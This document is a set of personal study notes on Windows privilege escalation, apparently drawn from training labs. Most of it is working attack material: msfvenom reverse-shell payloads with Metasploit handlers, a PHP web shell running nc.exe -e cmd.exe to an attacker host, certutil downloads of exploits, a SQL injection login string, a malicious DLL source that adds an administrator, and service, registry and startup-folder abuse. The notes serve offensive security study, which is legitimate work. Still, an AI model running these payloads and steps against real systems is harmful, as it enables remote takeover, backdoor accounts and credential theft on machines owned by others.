# Windows Privilege Escalation

Here I have attached my notes to understand the windows privilege escalation so some of this looks like attacker-victim simulations

## Gaining a Foothold

Gaining a foothold is the attacker way to get a low privileged user in a windows machine 

In the first stage we are scanning all the ports in the network of the host using the scanners like nmap

```
nmap -A -T4 -p- ip_address
```

There could be a possibility of the ftp port be open (via 21) and allow anonymous login (which can be logged in without any password). File Transfer Protocol is used to upload and download the files in the server

There could be a possibility of upload a file in a ftp login and can be viewed in the webpage which could also make the possibility of the reverse shell. Upload the reverse shell script according to the tech stack (php, asp, etc). For example the host is used to have asp executable

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip_address LPORT=4444 -f aspx > exploit.aspx

# run metasploit simulanously 
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
run 

# now upload in the ftp login
put exploit.aspx

# viewing in the webpage leads to the reverse shell and now we got the initial low privileged user 
```

We can also manually also exploit it, there are many github repository with the payloads. Here it is one of the foothold to gain low privileged access using ftp anonymous login. There could be many vulnerability exist to do it. The next step after gain low privileged access is to start escalate to higher privilege.

## Initial Enumeration

Enumeration is done after the initial access to get additional information about the target system like (system, user, network, password hunting, and av). We have five stages of hacking, In which first-three are scanning, enumeration and exploitation. Our final goal is to get the system administration access

After getting low privileged access using the meterpeter, call the shell for the effective use to navigate and command execution. 

### System Enumeration

```
shell

# The get the system information like hostname, os version and manufacturer informations 
systeminfo

# Effective usage for needed information
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

By using this we could found the architecture (x86 or x64) and can make the payload according to it. The os version contains the information about the kernel which would lead to kernel exploit later 

```
# getting a hostname information
hostname

# to get the information that system we are running on and to see the patch details 
wmic qfe

# logical disk 
wmic logicaldisk 
```

### User Enumeration 

```
# Current username in the system and we can verify that we are an system level user or not 
whoami

# we can see the privileges provided for the current user
whoami /priv 

# we can check the group which the current user found and can confirm their presence in any sort of the administrative groups 
whoami /groups

# To list the user in the machines
net user 

# we can see some informations about other users like last password changed, active account 
net user user_name
net user administrator (for admin informations)
```

### Network Enumeration

```
# To get the ip address of the machine and additional information about DNS server, etc
ipconfig

# To get the arp table 
arp -a 

# To get route table 
route print 
```

### Password Hunting 

In the password hunting first we going to search for the password in local system (stored file) or file. First step is somebody will store or make their wifi password same as the work credentials to make easier to remember, this password could be stored in registry 

```
# To search for the password in a word 
findstr /si password *.txt *.init
```

### AV Enumeration

We want to look at the configurations of firewall and Anti-viruses. We look the informations using service query 

```
# showing windows defender configurations
sc query windefend

# to find all the service running on the machine (used to find other anti-viruses)
sc queryex type= service 

# to see the firewall configurations
netsh advfirewall firewall dump

# if above command not worked (this is for the older versions)
netsh firewall show state 

# to see open ports and configuration in firewall
netsh firewall show config
```

## Exploring Automated Tools

There are three types of automated tools for the windows privilege escalation

### Executables

These are the file we can upload and compile it in the machine.

- [winPEAS.exe](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) 
- [Seatbelt.exe](https://github.com/GhostPack/Seatbelt) (compile)
- [Watson.exe](https://github.com/rasta-mouse/Watson) (compile)
- [SharpUp.exe](https://github.com/GhostPack/SharpUp) (compile)

### Powershell

- [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock/tree/master) 
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master)
- [jaws-enum.ps1](https://github.com/411Hall/JAWS/tree/master)

### Other

- [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) (local)
- Exploit Suggester (Metasploit)

> Notes:
> Do Powershell execution bypass to run all the powershell scripts by 
> `powershell -ep bypass` 

### Other resources

- [hacktricks](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)

## Kernel Exploits

The Kernel is a computer program that controls everything in the system. Facilitates interactions between hardware and software components (a translator)

```
                     [Application]
                           |
                           V 
                        [Kernel]
                           |
            -------------------------------
            |              |              |
            V              V              V 
          [CPU]        [Memory]      [Devices]
```

![images](./static/images/kernel.png)

There could be outdated software and these outdated software contains vulnerability so we want to check the kernel version in the target machines and make use of it to the exploitations

### Kernel Exploits using Metasploit

```
# start the metasploit 
msfconsole 

# after the initial low privilege access get the shell and run the windows-exploit-suggester in the metasploit 
run post/multi/recon/local_exploit_suggester 

# after getting few kernel exploit (example kitrap0d)
background
use exploit/windows/local/ms10_015_kitrap0d

# set the options like set the session to before session , set lhost to 5555 and lport to other port, not the port used before in initial access 
run 

# now we have high privilege
getuid
output - Server username: NT AUTHORITY\SYSTEM 
```

### Kernel Exploits by Manually

We are now going to manually exploit this using netcat 

```
# creating payload for reverse shell 
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f aspx > manual.aspx 

# Using the anonymous login in ftp in the first stage gain the reverse shell using netcat 
nc -nvlp 4444 

# using windows-exploit-suggester.py find a valid kernel expoit (example here MS11-059)
found a kernel exploit MS11-059 and searching in google to find a manual code to exploit this vulnerability

# host a python webserver to send the payload to the target machines and download using 
certutil -urlcache -f https://attacker_ip/MS11-059.exe ms.exe 

# we found code in github or other websites to exploit it and we gain high privilege
getuid 
output - NT AUTHORITY\SYSTEM
```

### Resource 

- [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

> Notes:
> Here there could be outdated resources so make the resources according to the new vulnerability and target machines versions 

## Password and Port Forwarding

At first we are going to gain a foothold so we are starting from nmap scan 

```
nmap -T4 -A -p- <target_ip>

# Using nmap scan we found target uses achat
searchsploit achat

# By the searchsploit we found there is a remote buffer overflow in the target and getting the code
cp /usr/share/exploitdb/exploits/windows/remote/36025.py 3.py 

# we gained low privilege escalation using the exploit and going to do enumeration for getting target weakness 
systeminfo
whoami
net users
net user alfred 
ipconfig
netstat -ano 
arp -a 

# finding passwords in the registry 
reg query HKLM /f password /t REG_5Z /s 
```

To make port forward we going to use the [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) and download the plink to the target system using the certutil 

By port forwarding of ssh we gained the access 

## Windows Subsystem for Linux

It is use to run linux in windows with or without the VMs. 

Now we want to get some initial foothold to the machine. Moving to the port 80 to see the website, it contains a login page so we are registering new account and login to it. And in the contact us their given a mail `tyler@random.com` it gives the username. The username enumeration is done in new registeration because it cannot allow the username as duplicate and says the username is already taken 

and by logining with the username and password using sql injection 

```
# credentials 
username and password - 'OR 1 OR'
```

Now we can see all the users notes in that the user tyler has the note of his credentials and name of smb folder and now using the psexec.py to get the initial access 

We have two website one in port 80 and other in the port 8880, port 8880 has direct access to smb 
```
psexec.py tyler:'his_password'@ip_address 

# it is blocked may be due to the antivirus or firewall so we got the credentials of tyler now we going to use the smb and got into it 
smbclient \\\\ip_address\\new-site -U tyler 

# we have nc.exe in the kali machine and uploading in the smb folder 
put nc.exe 

# uploading the reverse shell in the php with a filename (reverse.php)
<?php system('nc.exe -e cmd.exe attacker_ip port')?>

# upload the reverse shell 
put reverse.php

# now visiting the target site give us reverse shell 
https://target.site/reverse.php 

# we got the initial access 
systeminfo - with error : Access Denied

# we can't access efficiently so checking for the antivirus software and found the windows defender is up  
sc query windefend 
```

It could be exploited using the Windows Subsystem for Linux and refer for it is in [payloads all the things](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-windows-subsystem-for-linux-wsl) 

```
# Location of bash.exe 
where /R c:\windows bash.exe 

# Location of wsl.exe 
where /R c:\windows wsl.exe 

# execute the wsl.exe in the reverse shell we got 
path/wsl.exe whoami

# executing bash we can see it also executes the wsl for us 
path/bash.exe 
whoami -> root 
hostname -> random 
uname -a -> Linux random 

# it fails in tty so we using python to make it tty shell 
python -c "import pty;pty.spawn('/bin/bash')"

# Now we are in the wsl 
pwd 
ls -la 
history 

# we found administrator password in bash history
the command used is -> smbclient -U 'administrator%hispassword' \\\\127.0.0.1\\c$

# now we get the administrator access using it in smbclient to get admin access 
smbclient -U 'administratorhispassword' \\\\ip_address\\c$ 
```

But we can navigate inside the directories, we not gained full access now clone [impacket](https://github.com/fortra/impacket)

```
cd impacket 
psexec.py administrator:'hispassword@ip_address  

# if antivirus blocks it try it with other tool 
smbexec.py administrator:'hispassword'@ip_address

# now we became nt authority system 
whoami 
nt authority\system
```

## Token Impersonation and Potato Attacks

### Token Impersonation 

Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think it as cookies for computers 

**Two Types:** 

- Delegate - Created for logging into a machine or using Remote Desktop 
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script 

![image](./static/images/ti1.png)

![image](./static/images/ti2.png)

![image](./static/images/ti3.png)

**Alright, but what if a Domain Admin token was available?** 

![image](./static/images/ti4.png)

![image](./static/images/ti5.png)

![image](./static/images/ti6.png)

![image](./static/images/ti7.png)

To get to know about the impersonation privileges we can use 

![image](./static/images/ti8.png)

![image](./static/images/ti9.png)

here the ImpersonatePrivilege is enabled which could able to escalate to high privileged users 

Resources for [Impersonation Privileges](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges)

if SeAssignPrimaryToken is enabled it could vulnerable to the potato attacks 

### Potato Attack 

Resources for [Potato Attack](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

The idea behind this vulnerability is simple to describe at a high level:

- Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.

- Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.

- Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

So if we have service account running with the privileges to impersonate security token it is vulnerable to [juicy-potato attack](https://github.com/ohpe/juicy-potato)

In nmap result we can see there is http protocol running in the port 80 and port 50000. In port 135 RPC is running and In port 445 SMB is running.

In website in the port 50000 we found a directory askjeevs using directory busting and this directory running the jenkins. In jenkins we have script console which run groovy script so we are uploading a [groovy reverse shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

By uploading the groovy reverse shell we got the reverse shell and start the enumeration 

```
whoami  

# SeImpersonatePrivilege is enabled 
whoami /priv 

# save the systeminfo and use windows-exploit-suggester and found it is vulnerable potato attacks 
systeminfo 

# To perform potato attack metasploit framework is easier 
msfconsole 
use exploit/multi/script/web_delivery 
options 
show targets 

# the target contains python,php,powershell,etc and we set it to powershell
set target 2 
set payload windows/meterpreter/reverse_tcp 
set lhost attacker_ip 
set srvhost victim_ip 
run

# we got the script so we are going paste the script generated in the reverse shell that make the shell got in the metasploit framework
session 1 

# now we got the shell in the msfconsole 
getuid
getprivs 
run post/multi/recon/local_exploit_suggester 

# now we are going to do potato attack 
use exploit/windows/local/ms16_075_reflection 
background 
options 
set payload windows/x64/meterpreter/reverse_tcp
run 

# now we got the shell 
load incognito 
list_tokens -u 

# we have impersonate tokens (for system)
impersonate_token "NT AUTHORITY\SYSTEM"
shell 

# now we are system user 
whoami
nt authority\system 
```

here data is hidden in [alternate data stream](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams), it is used to hide a data within a file 

```
# to see the alternate stream file 
dir /R 

# to read the file 
more < file_name 
```

## GetSystem

We got a shell in the windows 7 using metasploit and there is buildin tool called getsystem

- getsystem is used after you already have a Meterpreter session on a target machine. Its purpose is to elevate privileges to SYSTEM (the highest privilege level on Windows)
- It attempts multiple privilege escalation techniques to impersonate the NT AUTHORITY\SYSTEM account

```
# making privilege escalation 
getsystem 

# to check the usage 
getsystem -h 
Usage: getsystem [options]
Attempt to elevate your privilege to that of local system.
OPTIONS:
-h        Help Banner.
-t   The technique to use. (Default to '0').
0 : All techniques available
1 : Service - Named Pipe Impersonation (In Memory/Admin)
2 : Service - Named Pipe Impersonation (Dropper/Admin)
3 : Service - Token Duplication (In Memory/Admin)
```

1. Named Pipe Impersonation

- Windows allows processes to communicate using named pipes (special files for inter-process communication)
- A high-privileged process (like SYSTEM) might connect to a pipe
- If the attacker (low-privileged user) creates a pipe first, and a SYSTEM process connects, the attacker can impersonate the token of that SYSTEM process
- Meterpreter sets up a malicious named pipe and tricks Windows into connecting with SYSTEM rights → attacker steals that identity
- Works if you have SeImpersonatePrivilege (common in service accounts) and Fails if impersonation rights are restricted or patched

2. Service-based Escalation

- On Windows, services often run with SYSTEM privileges.
- If an attacker can create or modify a service, they can make it run malicious code (like Meterpreter)
- getsystem tries to install a temporary service that runs as SYSTEM → executes payload → deletes the service
- Works if you have rights to create/manage services and Needs Administrator-level access at least (not just a normal user)

3. Token Duplication

- In Windows, when users or services log in, they are assigned tokens that define their privileges
- If SYSTEM or Administrator tokens exist in memory, a lower-privileged attacker may be able to duplicate one of those tokens
- This is often called token impersonation or token theft
- After duplicating a SYSTEM token, Meterpreter can "impersonate" SYSTEM without directly running code as SYSTEM
- Works if tokens are available in the session and doesn’t work if no privileged tokens exist in memory

Resource for [getsystem](https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem)

## RunAs 

RunAs command allow us to run command as somebody else 

```
# To look for stored credentials on the machine 
cmdkey /list 

# nmap result 
PORT    STATE  SERVICE  VERSION 
21/tcp  open   ftp      Microsoft ftpd 
23/tcp  open   telnet? 
80/tcp  open   http?
```

We moving to the website in the port 80 but nothing interesting, we see ftp port is open and anonymous login is allowed here. 

```
ftp> ls 
Backups
Engineer 

# for effectively transfering the file 
ftp> binary 
ftp> cd Backups 
ftp> ls 
backup.mdb 
ftp> get backup.mdb 
ftp> cd Engineer 
Access Control.zip 
ftp> get "Access Control.zip"

# we found a mdb and pst file so for that we can use linux tool are open in windows 
mdb-sql backup.mdb 
readpst access_control.pst 
```

while reading it we found the credentials in the database and we found the engineer credentials so with made unzip the Access Control.zip and It contains a mail with the credentials for security account 

```
# we have telnet port now login using found security account credentials 
telnet -l security ip_address 

# we successfully logged in and start enumerating 
cmdkey /;os 

# to see the stored credentials and we found domain password is stored (administrator)
cmdkey /list 

# now using the save credentials to get a file in system directory 
c:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\file_name > C:\Users\security\file_name" 
```

Resource for [runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))

## Registry

The Windows Registry is a central hierarchical database in Microsoft Windows that stores configuration settings and options for:

- The operating system (Windows itself)
- Installed software and applications
- User profiles and preferences
- Hardware devices and drivers

In simple words it is brain or blueprint for windows, where almost everything about how the system runs is recorded

## Autorun 

Autorun refers to specific registry keys that tell the operating system to automatically start a program, service, or script when the system boots or when a user logs in. We are going to see any thing run automatically have any permission that is useful for our exploitation 

**Victim**

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. In Autoruns, click on the ‘Logon’ tab
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file

here the autorun, accesschk are cis internal tools 

Now we found the file, so we moving for exploitation phase 

**Attacker**

```
# generate a payload for windows reverse shell 
msfvenom -p windows/meterpreter/reverse_tcp lhost=attacker_ip -f exe -o program.exe

msfconsole 
use multi/handler 
set payload windows/meterpreter/reverse_tcp 
set lhost attacker_ip 
option 
run 
```

Now host the payload program.exe using python server in the attacker side and download it in the victim side and replace with the program.exe in the AutoRun folder 

Now log out and sign in again in as high privileged user and now check the meterpreter we gained the reverse shell 

```
# we have gained reverse shell as administrator
getuid 
administrator
```

### Always Install Elevated 

The AlwaysInstallElevated setting is a Windows policy that affects how MSI (Microsoft Installer) packages are installed. When this policy is enabled, Windows Installer packages (.msi files) will always be installed with elevated (Administrator) privileges, even if the user who launches them does not have administrative rights. (AlwaysInstallElevated = 1 for this attack) 

now login as low privileged user in the victim machine 

**Victim**

```
# open cmd and type 
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# here we can see for both AlwaysInstallElevated is set to 1 so attack is possible 

# To understand the severity we can make a user add which run as high privilege and we can set the new user as administrator
Write-UserAddMSI 

# UserAdd.msi is generated running it we can set a new administrator called backdoor 
net localgroup administrator
backdoor
Administrator 
```

**Attacker** 

Generating the payload 

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=attacker_ip -f msi -o setup.msi
```

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost attacker_ip
run 
```

Now transfer the payload setup.msi to the victim windows machine using python server and run the setup.msi in the victim machine. now we gained the reverse shell 

```
# we gain the reverse shell as system 
getuid 
server username: NT AUTHORITY\SYSTEM 

# if we gained reverse shell as low level user then background the session of low level user 
background 
use exploit/windows/local/always_install_elevated 
set session 1 
run
```

### regsvc 

It is a Windows service that allows remote users (with proper permissions) to connect to the Windows Registry and read/write keys over the network 

**Victim** 

```
# open the powershell with bypassing the execution restrictions 
powershell -ep bypass 

# now see there is full control for regsvc for authority\system 
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

# so we found it contains full control so we going add a malicious service which add a administrator account for the attacker 
```

**Attacker** 

we going to get the file in windows and modify it and again run it. Here to get the file from the windows we are going to run a ftp using python 

```
python -m pyftplib -p 21 --write 

# now open cmd from the folder of windows_service.c in the victim machine and connect to the ftp with anonymous
ftp attacker_ip 
put windows_service.c 
```

Now the file is transferred to the attacker machine 

- Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
- Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
- Copy the generated file x.exe, to the Windows VM using python server 

**Again in Victim**

- Place x.exe in ‘C:\Temp’.
- Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
- In the command prompt type: sc start regsvc
- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

## Executable files 

A Windows service is a program that runs in the background and if a executable file is running as service with full access then it is exploitable 

**Victim**

```
#Open command prompt
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

# Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file
```

**Exploitation**

```
# we generated the malicious x.exe file in registry exploit, now use this here 

# Open command prompt
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc

# It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt
net localgroup administrators
```

## Startup Applications 

A startup application is a program that is automatically launched by Windows when the system boots or when a user logs in

**Victim**

```
# to get the informations about the startup apps, type in cmd 
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory 
```

**Attacker**

```
# generating a payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip -f exe -o x.exe

# now open metasploit framework 
msfconsole 
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost attacker_ip
run
```

Now using the python server transfer x.exe to the windows machine and save the file in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

Now log out the low privileged user account in the windows machine and when we login as high privileged account into the windows machine, we gain the reverse shell due to the malicious startup software 

```
# we gained reverse shell for high privileged account 
getuid 
server username: Administrator 
```

## DLL Hijacking 

**Dynamic Link Library**

- A DLL (Dynamic Link Library) is a file (extension .dll) that contains reusable code and functions
- Applications load DLLs when they need those functions (e.g., user32.dll for GUI functions)
- Loading is done via functions like LoadLibrary() or LoadLibraryEx() in Windows API

**DLL Hijacking** 

- DLL Hijacking happens when an attacker tricks an application into loading a malicious DLL instead of the legitimate one
- This works because Windows follows a search order when loading DLLs. If the application does not specify the full path of the DLL, Windows searches in a sequence of directories (e.g., the application folder, system directories, PATH, etc.)
- If the attacker can place a malicious DLL with the same name in a directory searched before the real DLL location, the application will load the attacker’s DLL

**Victim**

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location

Now copy 'C:\Users\User\Desktop\Tools\Source\windows_dll.c' to the attacker machine using ftp port open in the attacker machine

**Attacker** 

```
# open ftp port
python -m pyftpdlib -p 21 

# login in ftp using anonymous in windows machine 
ftp attacker_ip 
put windows_dll.c 
```

Content of windows_dll.c (to make the user as administrator privilege)

```
# For x64 compile with:  x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll 
# For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll 

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrator user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

**Exploitation** 

```
# Now compile the code 
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

# Now we are transffering the hijackme.dll to windows machine using python server and place in "C:\Temp"

# stop and start the dllsvc to make dll hijacking 
sc stop dllsvc & sc start dllsvc 

# successfully we made user as administrator
net localgroup administrators 
Administrator 
user 
```

## Service Permissions 

### Binary Path 

- It tells Windows which executable file (program or service binary) should run when the service starts
- Basically, it’s the path to the .exe (or .dll under svchost) that implements the service 
- If an attacker has permission to modify a service’s configuration (SERVICE_CHANGE_CONFIG), they can change the binPath to point to a malicious executable

**Victim** 

```
# to find the vulnerability using the powerup and now open powershell with execution policies bypass 
powershell -ep bypass 
. .\PowerUp.ps1 
Invoke-AllChecks 

# for manual checking 
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

# or 
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone * 

# Notice that the output suggests that the everyone has the “SERVICE_CHANGE_CONFIG” permission which could lead to change the path of the executable 

# now make the exploitation 
sc config daclsvc binpath= "net localgroup administrators user /add"

# check the binpath
sc qc daclsvc
sc start daclsvc

# now we made the user as administrator 
net localgroup administrators 
Administrator 
user 
```

### Unqouted Service Paths 

When a Windows service is created, it has a binary path (binPath / ImagePath) that tells Windows location of the service’s executable. If the path is not wrapped in quotes, Windows doesn’t know where the spaces end and tries different interpretations when starting the service

**Victim** 

```
# Open command prompt
sc qc unquotedsvc

# Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes
```

**Attacker** 

```
# generating the payload 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip -f exe -o common.exe 

# Now transfer the common.exe in the windows machine and Place common.exe in ‘C:\Program Files\Unquoted Path Service’ 

# now start the metasploit framework 
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp 
set lhost attacker_ip
run 

# now start the unquote services 
sc start unquotedsvc

# now we gained the reverse shell of administrator
getuid 
Server username: NT AUTHORITY\SYSTEM
```

## CVE-2019-1388

We found a http port open in port 80, so we starting directory busting 

while directory enumeration we found a directory retro and in retro it contain wp-content which suggest application is running wordpress and we found the credentials for the user wade in the retro directory 

```
# connecting the rdp and enter the password
xfreerdp /u:Wade /v:victim_ip:rdp_port

# perform the exploit
```

Resource for [CVE-2019-1388](https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388/)

## Resources

- [fuzzysecurity.com](https://fuzzysecurity.com/tutorials/16.html)
- [payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [sushant747.gitbooks.io](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
